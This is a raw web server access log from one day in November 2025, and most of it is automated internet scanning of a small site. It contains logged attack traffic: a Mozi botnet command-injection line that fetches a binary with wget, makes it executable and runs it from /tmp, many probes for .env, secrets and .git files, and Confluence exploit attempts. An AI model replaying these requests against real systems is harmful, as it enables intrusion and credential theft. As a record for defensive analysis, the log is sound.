87.121.84.80 - - [07/Nov/2025:09:34:48 +0000] "POST /cgi-bin/login HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
179.87.85.56 - - [07/Nov/2025:09:46:12 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 157 "-" "-" "-"
170.64.158.6 - - [07/Nov/2025:10:02:15 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:10:02:15 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
204.76.203.212 - - [07/Nov/2025:10:08:30 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.168.120.173 - - [07/Nov/2025:10:10:46 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
74.7.227.17 - - [07/Nov/2025:10:30:52 +0000] "GET / HTTP/2.0" 403 153 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)" "-"
3.143.33.63 - - [07/Nov/2025:10:33:08 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.143.33.63 - - [07/Nov/2025:10:34:53 +0000] "" 400 0 "-" "-" "-"
3.143.33.63 - - [07/Nov/2025:10:35:35 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.143.33.63 - - [07/Nov/2025:10:38:13 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03z\x5C\x83\xFD<M8\xC8\xB3\xDA3\xF4\xE2:\x8A&G\xC4\x18\x98TZd]\x90\x03\x9A\xCE\xE7\x0E\x1A\xA0\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
64.62.197.62 - - [07/Nov/2025:10:39:36 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF3Fg\x99\x90?\xD7\xE8P\x08)\x02\x06\x1D4s]\xE9T\x00\xD6\x8D\xC1=\x1E]JV\x0C\xAF6\xA7\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
3.143.33.63 - - [07/Nov/2025:10:39:46 +0000] "SSH-2.0-Go" 400 157 "-" "-" "-"
185.170.144.3 - - [07/Nov/2025:10:41:52 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-" "-"
3.143.33.63 - - [07/Nov/2025:10:42:13 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03~i\x0CO\xA9\xB4\xB6\xF3f#\x8F\xFF\xD9>\x99\xE7\xF4\xF1\xFA\x12?(Su\x9Eq>\x0Bl\xBC]\xF9\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
164.90.216.3 - - [07/Nov/2025:10:52:54 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03cHG\x8D\x10t\x96*eF!\xA6\xCD\xCC\xA3\xF2\xADdS\xAB\xA7\xC1\x0C\x18\xDA\x0C\xA3k\xE6>\xC5\x01\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
164.90.216.3 - - [07/Nov/2025:10:52:55 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36" "-"
104.23.251.114 - - [07/Nov/2025:11:06:52 +0000] "POST /session HTTP/2.0" 200 194 "https://noblog.nodove.com/" "Mozilla/5.0 (Android 15; Mobile; rv:144.0) Gecko/144.0 Firefox/144.0" "175.202.19.14"
185.242.226.114 - - [07/Nov/2025:11:15:25 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
198.235.24.114 - - [07/Nov/2025:11:16:27 +0000] "GET / HTTP/1.1" 403 153 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
204.76.203.219 - - [07/Nov/2025:11:24:29 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
185.170.144.3 - - [07/Nov/2025:11:27:51 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-" "-"
170.64.158.6 - - [07/Nov/2025:11:34:07 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:11:34:08 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
104.152.52.231 - - [07/Nov/2025:11:48:30 +0000] "GET / HTTP/1.1" 403 153 "-" "curl/7.61.1" "-"
104.152.52.231 - - [07/Nov/2025:11:48:30 +0000] "GET /favicon.ico HTTP/1.1" 403 153 "-" "curl/7.61.1" "-"
43.157.191.20 - - [07/Nov/2025:11:48:39 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
185.242.226.114 - - [07/Nov/2025:12:05:49 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03\xDF8\xF2\xEE\xC4\x0E&+k[MY\xD4\x5CG\x86\xBC\xB5X\x22e\xA8\xD6Xj\xF7\x9B\xCE?\xBF)o\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
195.178.110.74 - - [07/Nov/2025:12:18:55 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "-"
101.36.121.22 - - [07/Nov/2025:12:24:29 +0000] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03p\xB8\x8E\x9D^\x8BM\x8B\xD47,\x1E5\xCC\x83\x86\x5C\xC4k\xDC\xC7\xE1\xB6^l\xD0\xF2i\xC1u\xA6\xC0 \xFF\x8DV`\x90\x83G\xD0\xC4\xAA\xB6M\x93\xA4\xBBl" 400 157 "-" "-" "-"
101.36.121.22 - - [07/Nov/2025:12:24:39 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" "-"
101.36.121.22 - - [07/Nov/2025:12:24:58 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
101.36.121.22 - - [07/Nov/2025:12:24:58 +0000] "GET /robots.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
101.36.121.22 - - [07/Nov/2025:12:24:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
78.153.140.178 - - [07/Nov/2025:12:50:26 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Opera/9.5 (Windows NT 6.0; U; en)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:27 +0000] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B72 Safari/602.1" "-"
78.153.140.178 - - [07/Nov/2025:12:50:27 +0000] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; U; CPU OS OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10" "-"
78.153.140.178 - - [07/Nov/2025:12:50:28 +0000] "GET /admin/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.4410) Gecko/20110902 Firefox/3.6" "-"
78.153.140.178 - - [07/Nov/2025:12:50:29 +0000] "GET /.env.example HTTP/1.1" 404 153 "-" "Opera/6.01 (Windows 98; U)  [de]" "-"
78.153.140.178 - - [07/Nov/2025:12:50:29 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU 0S 5_0_1 like Mac OS X) AppleWebkit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3" "-"
78.153.140.178 - - [07/Nov/2025:12:50:30 +0000] "GET /?phpinfo=-1 HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.79 Safari/537.1" "-"
78.153.140.178 - - [07/Nov/2025:12:50:31 +0000] "GET /Backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; MILESTONE3 Build/5.5.1.1-84_D3G-25) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" "-"
78.153.140.178 - - [07/Nov/2025:12:50:32 +0000] "GET /Application/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36" "-"
78.153.140.178 - - [07/Nov/2025:12:50:33 +0000] "GET /sendgrid/.env HTTP/1.1" 404 153 "-" "Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.39.24.3 (POLAROID, Mxl661L32, wireless) VSTVB_MB97  SmartTvA/3.0.0" "-"
78.153.140.178 - - [07/Nov/2025:12:50:34 +0000] "GET /staging.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16" "-"
78.153.140.178 - - [07/Nov/2025:12:50:35 +0000] "GET /dashboard/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36" "-"
78.153.140.178 - - [07/Nov/2025:12:50:36 +0000] "GET /php-info HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:36 +0000] "GET /services/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0" "-"
78.153.140.178 - - [07/Nov/2025:12:50:37 +0000] "GET /config/secrets.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-nz; GT-S5570 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" "-"
78.153.140.178 - - [07/Nov/2025:12:50:38 +0000] "GET /admin/info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 OPR/33.0.1990.115" "-"
78.153.140.178 - - [07/Nov/2025:12:50:38 +0000] "GET /server.js HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C107 Safari/604.1" "-"
78.153.140.178 - - [07/Nov/2025:12:50:39 +0000] "GET /env.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174" "-"
78.153.140.178 - - [07/Nov/2025:12:50:40 +0000] "GET /core/.env.prod HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/416.12 (KHTML, like Gecko) Safari/416.13_Adobe" "-"
78.153.140.178 - - [07/Nov/2025:12:50:40 +0000] "GET /uploads/.env HTTP/1.1" 404 153 "-" "Opera/9.30 (Nintendo Wii; U; ; 2047-7;en)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:41 +0000] "GET /shop/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" "-"
78.153.140.178 - - [07/Nov/2025:12:50:42 +0000] "GET /assets/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5" "-"
78.153.140.178 - - [07/Nov/2025:12:50:43 +0000] "GET /sendgrid.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36 OPR/28.0.1750.40" "-"
78.153.140.178 - - [07/Nov/2025:12:50:43 +0000] "GET /sources/.env.prod HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.1; fr-fr; GT-N8010 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" "-"
78.153.140.178 - - [07/Nov/2025:12:50:44 +0000] "GET /sources/.env.production HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:45 +0000] "GET /v1/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5 (ax)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:46 +0000] "GET /js/.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; MDDRJS)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:47 +0000] "GET /boot/.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)" "-"
78.153.140.178 - - [07/Nov/2025:12:50:47 +0000] "GET /run/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; ADR930L 4G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
78.153.140.178 - - [07/Nov/2025:12:50:48 +0000] "GET /proc/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36" "-"
162.216.150.87 - - [07/Nov/2025:12:53:16 +0000] "GET / HTTP/1.1" 403 153 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
170.64.158.6 - - [07/Nov/2025:12:57:29 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:12:57:30 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
188.253.1.5 - - [07/Nov/2025:12:58:46 +0000] "\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00" 400 157 "-" "-" "-"
188.253.1.5 - - [07/Nov/2025:12:58:46 +0000] "\x05\x01\x00" 400 157 "-" "-" "-"
188.253.1.5 - - [07/Nov/2025:12:58:46 +0000] "CONNECT example.com:80 HTTP/1.1" 400 157 "-" "-" "-"
87.236.176.78 - - [07/Nov/2025:13:01:01 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" "-"
204.76.203.212 - - [07/Nov/2025:13:20:12 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
204.76.203.219 - - [07/Nov/2025:13:21:58 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
194.165.16.165 - - [07/Nov/2025:13:25:40 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-" "-"
104.23.251.115 - - [07/Nov/2025:13:42:26 +0000] "OPTIONS /session HTTP/2.0" 204 0 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:26 +0000] "POST /session HTTP/2.0" 200 173 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:26 +0000] "OPTIONS /session/ses_5a17224dbffeyH2POdSbjcBRTk/message HTTP/2.0" 204 0 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:29 +0000] "POST /session/ses_5a17224dbffeyH2POdSbjcBRTk/message HTTP/2.0" 200 12695 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:29 +0000] "GET /session/ses_5a17224dbffeyH2POdSbjcBRTk/message HTTP/2.0" 200 13029 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:46 +0000] "OPTIONS /session/ses_5a17224dbffeyH2POdSbjcBRTk/message HTTP/2.0" 204 0 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
104.23.251.115 - - [07/Nov/2025:13:42:49 +0000] "POST /session/ses_5a17224dbffeyH2POdSbjcBRTk/message HTTP/2.0" 200 13447 "https://ai-failure-chat.nodove.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0" "175.202.19.10"
43.130.100.35 - - [07/Nov/2025:13:46:59 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
170.64.158.6 - - [07/Nov/2025:13:48:07 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:13:48:08 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
43.156.228.27 - - [07/Nov/2025:13:48:09 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /template/custom/content-editor HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /templates/editor-preload-container HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /confluence/pages/createpage-entervariables.action HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /pages/doenterpagevariables.action HTTP/1.1" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /pages/createpage.action?spaceKey=myproj HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /pages/createpage-entervariables.action HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /wiki/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /pages/templates2/viewpagetemplate.action HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
141.98.82.26 - - [07/Nov/2025:14:16:07 +0000] "POST /users/user-dark-features HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15" "-"
141.98.82.26 - - [07/Nov/2025:14:16:08 +0000] "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" "-"
141.98.82.26 - - [07/Nov/2025:14:16:08 +0000] "POST /pages/createpage-entervariables.action HTTP/1.1" 403 555 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36" "-"
141.98.82.26 - - [07/Nov/2025:14:16:08 +0000] "POST /confluence/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" "-"
141.98.82.26 - - [07/Nov/2025:14:16:09 +0000] "POST /wiki/pages/createpage-entervariables.action HTTP/1.1" 403 153 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
103.203.57.3 - - [07/Nov/2025:14:31:28 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
213.209.157.254 - - [07/Nov/2025:15:13:33 +0000] "GET /.git/index HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1" "-"
204.76.203.219 - - [07/Nov/2025:15:16:07 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
45.148.10.95 - - [07/Nov/2025:15:28:58 +0000] "GET /.git/config HTTP/1.1" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
20.65.136.87 - - [07/Nov/2025:16:03:12 +0000] "MGLNDD_175.202.19.10_443" 400 157 "-" "-" "-"
185.113.8.97 - - [07/Nov/2025:16:18:22 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
13.86.117.139 - - [07/Nov/2025:16:43:30 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 zgrab/0.x" "-"
